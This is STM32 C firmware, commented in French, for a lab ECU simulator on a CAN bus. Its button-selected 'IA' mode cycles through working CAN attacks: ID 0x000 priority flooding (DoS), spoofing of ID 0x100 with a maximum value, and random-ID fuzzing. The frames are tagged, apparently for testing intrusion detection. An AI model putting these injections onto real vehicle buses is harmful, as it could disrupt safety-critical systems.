/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file    main.c  (NUCLEO-F446RE — ECU Simulateur Automobile & Generateur d'Attaques IA)
  * @brief   • MODE 0 (MANUEL) : Lecture potentiometre PA0 -> transmission CAN ID 0x100 @ 50ms
  *          • MODE 1 (MODE IA) : Generateur autonome d'attaques cyber (DoS, Spoofing, Fuzzing)
  *          • Bouton B1 (PC13 EXTI) : Bascule entre Mode Manuel et Mode IA
  *          • LED LD2 (PA5) : Temoin visuel (1 Hz = Manuel sain, 10 Hz = Mode IA Actif)
  *
  *  Brochage CAN  : PB8 = CAN1_RX, PB9 = CAN1_TX -> Transceiver SN65HVD230 (500 kbps)
  *  Potentiometre : PA0 (ADC1_IN0)
  *  Bouton B1     : PC13 (Interruption EXTI15_10)
  *  LED Temoin    : PA5 (LD2 Verte)
  *  Horloge       : HSI -> PLL -> 84 MHz (APB1 = 42 MHz)
  ******************************************************************************
  */
/* USER CODE END Header */

#include "main.h"
#include <string.h>
#include <stdio.h>

/* ============================================================================
 * DEFINITIONS & MODES
 * ============================================================================ */
#define MODE_MANUAL 0  /* Mode Manuel : Potentiometre temps reel */
#define MODE_AI     1  /* Mode IA : Generateur autonome de cyber-anomalies */

/* Variables d'etat du systeme */
static volatile uint8_t system_mode = MODE_MANUAL;
static volatile uint32_t last_btn_press = 0;

/* Buffers CAN */
CAN_HandleTypeDef        hcan1;
ADC_HandleTypeDef        hadc1;
TIM_HandleTypeDef        htim2;
static CAN_TxHeaderTypeDef can_tx_header;
static uint8_t             can_tx_data[8];
static uint32_t            can_tx_mailbox;

/* Prototypes */
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_ADC1_Init(void);
static void MX_CAN1_Init(void);
static uint16_t ADC_ReadPot(void);
static void CAN_Send(uint32_t id, uint8_t *data, uint8_t dlc);

/* Lecture ADC potentiometre sur PA0 (0-4095) */
static uint16_t ADC_ReadPot(void)
{
    ADC_ChannelConfTypeDef sc = {0};
    sc.Channel      = ADC_CHANNEL_0;
    sc.Rank         = 1;
    sc.SamplingTime = ADC_SAMPLETIME_56CYCLES;
    HAL_ADC_ConfigChannel(&hadc1, &sc);

    HAL_ADC_Start(&hadc1);
    if (HAL_ADC_PollForConversion(&hadc1, 20) == HAL_OK)
    {
        uint16_t v = (uint16_t)HAL_ADC_GetValue(&hadc1);
        HAL_ADC_Stop(&hadc1);
        return v;
    }
    HAL_ADC_Stop(&hadc1);
    return 0;
}

/* Envoi d'une trame CAN 2.0B standard (500 kbps) */
static void CAN_Send(uint32_t id, uint8_t *data, uint8_t dlc)
{
    can_tx_header.StdId              = id;
    can_tx_header.ExtId              = 0;
    can_tx_header.RTR                = CAN_RTR_DATA;
    can_tx_header.IDE                = CAN_ID_STD;
    can_tx_header.DLC                = dlc;
    can_tx_header.TransmitGlobalTime = DISABLE;

    uint32_t t0 = HAL_GetTick();
    while (HAL_CAN_GetTxMailboxesFreeLevel(&hcan1) == 0)
    {
        if (HAL_GetTick() - t0 > 4) return; // Eviter le blocage de boucle
    }
    HAL_CAN_AddTxMessage(&hcan1, &can_tx_header, data, &can_tx_mailbox);
}

/* Interruption Bouton Utilisateur B1 (PC13) avec anti-rebond logiciel */
void HAL_GPIO_EXTI_Callback(uint16_t GPIO_Pin)
{
    if (GPIO_Pin == GPIO_PIN_13)
    {
        uint32_t now = HAL_GetTick();
        if (now - last_btn_press > 250) // Anti-rebond 250 ms
        {
            last_btn_press = now;
            system_mode = (system_mode == MODE_MANUAL) ? MODE_AI : MODE_MANUAL;
        }
    }
}

/* ============================================================================
 * PROGRAMME PRINCIPAL
 * ============================================================================ */
int main(void)
{
    HAL_Init();
    SystemClock_Config();
    MX_GPIO_Init();
    MX_ADC1_Init();
    MX_CAN1_Init();

    HAL_Delay(100);

    /* Demarrage du peripherique CAN1 */
    HAL_CAN_Start(&hcan1);

    uint32_t last_led_toggle = 0;
    uint32_t ai_scenario_timer = 0;
    uint8_t  ai_current_attack = 0; // 0=DoS, 1=Spoofing, 2=Fuzzing
    uint32_t fuzz_seed = 0;

    while (1)
    {
        uint32_t now = HAL_GetTick();

        // ====================================================================
        // GESTION DU TEMOIN VISUEL LED LD2 (PA5)
        // ====================================================================
        uint32_t led_interval = (system_mode == MODE_MANUAL) ? 500 : 50; // 1 Hz (Manuel) vs 10 Hz (IA)
        if (now - last_led_toggle >= led_interval)
        {
            last_led_toggle = now;
            HAL_GPIO_TogglePin(GPIOA, GPIO_PIN_5);
        }

        // ====================================================================
        // GESTION DU TRAFIC CAN SELON LE MODE CHOISI
        // ====================================================================
        if (system_mode == MODE_MANUAL)
        {
            /* ----------------------------------------------------------------
             * MODE MANUEL : Potentiometre PA0 -> ID 0x100 nominal (50 ms)
             * ---------------------------------------------------------------- */
            uint16_t pot = ADC_ReadPot();

            can_tx_data[0] = (uint8_t)(pot & 0xFF);
            can_tx_data[1] = (uint8_t)(pot >> 8);
            can_tx_data[2] = 0x00;
            can_tx_data[3] = 0x00;
            can_tx_data[4] = 0x00;
            can_tx_data[5] = 0x00;
            can_tx_data[6] = 0x00; // Tag 0x00 = Flux Normal Certifie
            can_tx_data[7] = can_tx_data[0] ^ can_tx_data[1];

            CAN_Send(0x100, can_tx_data, 8);
            HAL_Delay(50); // Cadence nominale automobile 20 Hz (50 ms)
        }
        else
        {
            /* ----------------------------------------------------------------
             * MODE IA : Generateur Autonome de Cyber-Anomalies (Scenarios)
             * Alterne automatiquement entre DoS, Spoofing et Fuzzing toutes les 3s
             * ---------------------------------------------------------------- */
            if (now - ai_scenario_timer > 3000)
            {
                ai_scenario_timer = now;
                ai_current_attack = (ai_current_attack + 1) % 3;
            }

            switch (ai_current_attack)
            {
                case 0:
                    /* [ATTAQUE 1 : DoS FLOODING]
                     * ID 0x000 a priorite absolue en rafale ultra-rapide (2 ms) */
                    memset(can_tx_data, 0xFF, 6);
                    can_tx_data[6] = 0x01; // Tag Attaque DoS
                    can_tx_data[7] = 0xAA;
                    CAN_Send(0x000, can_tx_data, 8);
                    HAL_Delay(2); // Rafale haute frequence
                    break;

                case 1:
                    /* [ATTAQUE 2 : SPOOFING / INJECTION]
                     * Usurpation de l'ID 0x100 avec saut brusque a 4095 */
                    can_tx_data[0] = 0xFF;
                    can_tx_data[1] = 0x0F; // Valeur 4095
                    can_tx_data[2] = 0x55;
                    can_tx_data[3] = 0xAA;
                    can_tx_data[4] = 0x00;
                    can_tx_data[5] = 0x00;
                    can_tx_data[6] = 0x02; // Tag Attaque Spoofing
                    can_tx_data[7] = 0xBB;
                    CAN_Send(0x100, can_tx_data, 8);
                    HAL_Delay(10);
                    break;

                case 2:
                default:
                    /* [ATTAQUE 3 : FUZZING / CORRUPTION]
                     * IDs aleatoires hors-matrice et payload aleatoire */
                    fuzz_seed++;
                    uint32_t rand_id = 0x200 + (fuzz_seed % 0x1FF);
                    for (int i = 0; i < 8; i++) {
                        can_tx_data[i] = (uint8_t)((fuzz_seed * (i + 3)) & 0xFF);
                    }
                    can_tx_data[6] = 0x03; // Tag Attaque Fuzzing
                    can_tx_data[7] = 0xCC;
                    CAN_Send(rand_id, can_tx_data, 8);
                    HAL_Delay(15);
                    break;
            }
        }
    }
}

/* ============================================================================
 * CONFIGURATION DU MATERIEL (CLOCK, ADC, CAN, GPIO)
 * ============================================================================ */

/* Horloge systeme : HSI -> PLL -> 84 MHz (APB1 = 42 MHz) */
void SystemClock_Config(void)
{
    RCC_OscInitTypeDef RCC_OscInitStruct = {0};
    RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};

    __HAL_RCC_PWR_CLK_ENABLE();
    __HAL_PWR_VOLTAGESCALING_CONFIG(PWR_REGULATOR_VOLTAGE_SCALE3);

    RCC_OscInitStruct.OscillatorType      = RCC_OSCILLATORTYPE_HSI;
    RCC_OscInitStruct.HSIState            = RCC_HSI_ON;
    RCC_OscInitStruct.HSICalibrationValue = RCC_HSICALIBRATION_DEFAULT;
    RCC_OscInitStruct.PLL.PLLState        = RCC_PLL_ON;
    RCC_OscInitStruct.PLL.PLLSource       = RCC_PLLSOURCE_HSI;
    RCC_OscInitStruct.PLL.PLLM            = 16;
    RCC_OscInitStruct.PLL.PLLN            = 336;
    RCC_OscInitStruct.PLL.PLLP            = RCC_PLLP_DIV4;
    RCC_OscInitStruct.PLL.PLLQ            = 7;
    RCC_OscInitStruct.PLL.PLLR            = 2;
    if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK) { Error_Handler(); }

    RCC_ClkInitStruct.ClockType      = RCC_CLOCKTYPE_HCLK | RCC_CLOCKTYPE_SYSCLK
                                     | RCC_CLOCKTYPE_PCLK1 | RCC_CLOCKTYPE_PCLK2;
    RCC_ClkInitStruct.SYSCLKSource   = RCC_SYSCLKSOURCE_PLLCLK;
    RCC_ClkInitStruct.AHBCLKDivider  = RCC_SYSCLK_DIV1;
    RCC_ClkInitStruct.APB1CLKDivider = RCC_HCLK_DIV2;
    RCC_ClkInitStruct.APB2CLKDivider = RCC_HCLK_DIV1;
    if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct, FLASH_LATENCY_2) != HAL_OK) { Error_Handler(); }
}

/* ADC1 pour potentiometre PA0 */
static void MX_ADC1_Init(void)
{
    hadc1.Instance                   = ADC1;
    hadc1.Init.ClockPrescaler        = ADC_CLOCK_SYNC_PCLK_DIV2;
    hadc1.Init.Resolution            = ADC_RESOLUTION_12B;
    hadc1.Init.ScanConvMode          = DISABLE;
    hadc1.Init.ContinuousConvMode    = DISABLE;
    hadc1.Init.DiscontinuousConvMode = DISABLE;
    hadc1.Init.ExternalTrigConvEdge  = ADC_EXTERNALTRIGCONVEDGE_NONE;
    hadc1.Init.ExternalTrigConv      = ADC_SOFTWARE_START;
    hadc1.Init.DataAlign             = ADC_DATAALIGN_RIGHT;
    hadc1.Init.NbrOfConversion       = 1;
    hadc1.Init.DMAContinuousRequests = DISABLE;
    hadc1.Init.EOCSelection          = ADC_EOC_SINGLE_CONV;
    if (HAL_ADC_Init(&hadc1) != HAL_OK) { Error_Handler(); }
}

/* CAN1 : 500 kbps @ APB1=42 MHz (Prescaler=4, BS1=15, BS2=5 -> 21 TQ) */
static void MX_CAN1_Init(void)
{
    hcan1.Instance                  = CAN1;
    hcan1.Init.Prescaler            = 4;
    hcan1.Init.Mode                 = CAN_MODE_NORMAL;
    hcan1.Init.SyncJumpWidth        = CAN_SJW_1TQ;
    hcan1.Init.TimeSeg1             = CAN_BS1_15TQ;
    hcan1.Init.TimeSeg2             = CAN_BS2_5TQ;
    hcan1.Init.TimeTriggeredMode    = DISABLE;
    hcan1.Init.AutoBusOff           = ENABLE;
    hcan1.Init.AutoWakeUp           = DISABLE;
    hcan1.Init.AutoRetransmission   = ENABLE;
    hcan1.Init.ReceiveFifoLocked    = DISABLE;
    hcan1.Init.TransmitFifoPriority = DISABLE;
    if (HAL_CAN_Init(&hcan1) != HAL_OK) { Error_Handler(); }

    CAN_FilterTypeDef f = {0};
    f.FilterBank           = 0;
    f.FilterMode           = CAN_FILTERMODE_IDMASK;
    f.FilterScale          = CAN_FILTERSCALE_32BIT;
    f.FilterIdHigh         = 0x0000;
    f.FilterIdLow          = 0x0000;
    f.FilterMaskIdHigh     = 0x0000;
    f.FilterMaskIdLow      = 0x0000;
    f.FilterFIFOAssignment = CAN_RX_FIFO0;
    f.FilterActivation     = ENABLE;
    if (HAL_CAN_ConfigFilter(&hcan1, &f) != HAL_OK) { Error_Handler(); }
}

/* GPIO Init : CAN (PB8/PB9) + Bouton B1 (PC13) + LED LD2 (PA5) */
static void MX_GPIO_Init(void)
{
    GPIO_InitTypeDef g = {0};

    __HAL_RCC_GPIOA_CLK_ENABLE();
    __HAL_RCC_GPIOB_CLK_ENABLE();
    __HAL_RCC_GPIOC_CLK_ENABLE();

    /* LED LD2 (PA5) */
    HAL_GPIO_WritePin(GPIOA, GPIO_PIN_5, GPIO_PIN_RESET);
    g.Pin   = GPIO_PIN_5;
    g.Mode  = GPIO_MODE_OUTPUT_PP;
    g.Pull  = GPIO_NOPULL;
    g.Speed = GPIO_SPEED_FREQ_LOW;
    HAL_GPIO_Init(GPIOA, &g);

    /* CAN1 Pins : PB8 (RX), PB9 (TX) */
    g.Pin       = GPIO_PIN_8 | GPIO_PIN_9;
    g.Mode      = GPIO_MODE_AF_PP;
    g.Pull      = GPIO_NOPULL;
    g.Speed     = GPIO_SPEED_FREQ_VERY_HIGH;
    g.Alternate = GPIO_AF9_CAN1;
    HAL_GPIO_Init(GPIOB, &g);

    /* Bouton Utilisateur B1 (PC13) avec interruption */
    g.Pin  = GPIO_PIN_13;
    g.Mode = GPIO_MODE_IT_FALLING;
    g.Pull = GPIO_NOPULL;
    HAL_GPIO_Init(GPIOC, &g);

    HAL_NVIC_SetPriority(EXTI15_10_IRQn, 2, 0);
    HAL_NVIC_EnableIRQ(EXTI15_10_IRQn);
}

void Error_Handler(void)
{
    __disable_irq();
    while (1) { }
}
